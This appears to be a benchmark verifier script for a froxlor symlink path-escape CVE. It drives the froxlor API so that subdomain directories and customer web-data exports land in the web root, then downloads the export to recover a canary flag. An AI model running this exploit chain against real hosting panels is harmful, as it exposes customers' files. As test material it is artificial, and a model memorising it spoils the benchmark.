#!/usr/bin/env bash
# verify.sh --seed|--residual — froxlor-cve-2026-41231 (PCBV2-0038)
#
# 机制：CVE-2023-6069（FileDir::makeCorrectDir 无 symlink 解析检查，客户路径可经
#       homedir 内 symlink 逃逸）在 2.1.0 用 $fixed_homedir 修复并覆盖
#       FTP/DirOptions/DirProtections/SubDomains，但 DataDump.add 漏了 ->
#       CVE-2026-41231（2.3.6 才补上 $customer['documentroot']）。
#   seed     SubDomains.add(path=pcbseed/newout)：$HOMEDIR/pcbseed 是指向 web 根
#            /var/www/html/seedout 的 symlink，cron 生成 Apache 配置并创建
#            /var/www/html/seedout/newout/ -> GET /seedout/newout/ 200
#            V0(2.0.11) 无检查 -> 200 | V1(2.3.5) 6069 修复抛异常 -> 404
#   residual DataDump.add(path=dumps, dump_web=1)：$HOMEDIR/dumps 指向
#            /var/www/html/dumpout，ExportCron 把 pcbcust-export_*.tar.gz（内含
#            客户 docroot 的 canary flag.txt）写进 web 根 -> 下载解包得 flag
#            V1(2.3.5) 达效果 | V2(2.3.6) makeCorrectDir 拒绝 symlink -> 无导出
# 效果通道 = seed: /seedout/newout/ HTTP 200（目录出现）；residual: 下载的
#            tar.gz 内 flag.txt 明文。判定基准 = RUN_FLAG_REF（回退 RUN_FLAG）。
# 认证 = API Basic auth pcbkey:pcbsecret（入口脚本经真实 froxlor API 建好）。
# 退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }

CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
FLAG_REF="$RUN_FLAG"
mkdir -p "$WORK_DIR" 2>/dev/null || true

# 目标端口：优先 docker compose port 动态解析，回退 case 固定端口
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-80}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT=41830;; v1) PORT=41831;; v2) PORT=41832;;
  esac
fi
# 动态端口优先（compose 已转 PORT_ 动态端口）；失败回退硬编码
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"
CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" ps -q "$VERSION" 2>/dev/null | head -1)"
if [[ -z "$CID" ]]; then
  echo "verify: container for $VERSION not running" >&2
  exit 20
fi

# 就绪等待：froxlor 首次安装（install + cron）很慢，最长等 ~5 分钟
for _ in $(seq 1 150); do
  if curl -s -o /dev/null -m 3 "http://127.0.0.1:$PORT/"; then break; fi
  sleep 2
done

OUT="$("$PY" - "$PORT" "$FLAG_REF" "$VERSION" "$MODE" "$CID" <<'PYEOF'
import base64, gzip, io, json, subprocess, sys, tarfile, time, urllib.error, urllib.request
port, flag, version, mode, cid = sys.argv[1:6]
base = "http://127.0.0.1:%s" % port
auth = base64.b64encode(b"pcbkey:pcbsecret").decode()


def api(command, params):
    payload = json.dumps({"command": command, "params": params}).encode()
    req = urllib.request.Request(
        base + "/api.php", data=payload, method="POST",
        headers={"Content-Type": "application/json", "Authorization": "Basic " + auth})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def http_get(path):
    try:
        with urllib.request.urlopen(base + path, timeout=30) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()


def cron():
    r = subprocess.run(
        ["docker", "exec", cid, "php", "/var/www/html/bin/froxlor-cli",
         "froxlor:cron", "export", "tasks", "--force"],
        capture_output=True, text=True, timeout=240)
    return r.returncode


if mode == "--seed":
    st, api_body = api("SubDomains.add", {
        "domain": "pcb.local", "subdomain": "seed1", "path": "pcbseed/newout"})
    cron()
    hst, _ = http_get("/seedout/newout/")
    print("[seed] api=%s api_body=%r http_seedout=%s" % (st, api_body[:120], hst))
    sys.exit(0 if hst == 200 else 10)
else:
    st, api_body = api("DataDump.add", {
        "path": "dumps", "dump_dbs": "0", "dump_mail": "0", "dump_web": "1"})
    cron()
    name, txt = "", ""
    for _ in range(10):
        r = subprocess.run(["docker", "exec", cid, "ls", "-t", "/var/www/html/dumpout"],
                           capture_output=True, text=True, timeout=30)
        files = [f for f in (r.stdout or "").splitlines() if f.endswith(".tar.gz")]
        if files:
            name = files[0]
            break
        time.sleep(3)
    if not name:
        print("[residual] no export tar.gz created (blocked)")
        sys.exit(10)
    hst, data = http_get("/dumpout/" + name)
    if hst != 200:
        print("[residual] download %s status=%s" % (name, hst))
        sys.exit(10)
    try:
        outer = tarfile.open(fileobj=io.BytesIO(data), mode="r:gz")
        for member in outer.getmembers():
            if member.name.endswith("-web.tar.gz"):
                inner = gzip.decompress(outer.extractfile(member).read())
                it = tarfile.open(fileobj=io.BytesIO(inner), mode="r:")
                for m2 in it.getmembers():
                    if m2.name.endswith("/flag.txt") or m2.name == "flag.txt":
                        txt = it.extractfile(m2).read().decode("utf-8", "replace")
    except Exception as e:
        print("[residual] extract error: %s" % e)
        txt = ""
    print("[residual] api=%s file=%s flag_in=%s" % (st, name, flag in txt))
    sys.exit(0 if flag in txt else 10)
PYEOF
)"
rc=$?
echo "$OUT"
echo "verify[$MODE] version=$VERSION rc=$rc (flag_ref=$FLAG_REF)" >&2
exit "$rc"
